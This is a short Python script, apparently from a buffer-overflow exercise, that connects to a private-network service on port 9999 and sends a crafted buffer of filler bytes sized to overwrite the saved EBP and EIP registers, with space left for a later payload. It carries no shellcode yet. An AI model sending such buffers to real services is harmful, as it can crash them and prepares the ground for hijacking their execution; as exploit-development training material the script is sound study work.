import socket
	
ip = "192.168.9.2"
port = 9999

n_bytes_crash = 520

n_bytes_ebp = 4

n_bytes_eip = 4

n_bytes_buffer_salto = 500

client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect((ip,port))

print("[+] Enviando Buffer de 520 x 'A'| 4 x 'B' | 4 x 'C' | 500 x 'D' [+]")

buffer = b"A" * n_bytes_crash + b"B" * n_bytes_ebp + b"C" * n_bytes_eip + b"D" * n_bytes_buffer_salto
	
client.send(buffer)

# print(client.recv(1024))
	
client.close()
			
 
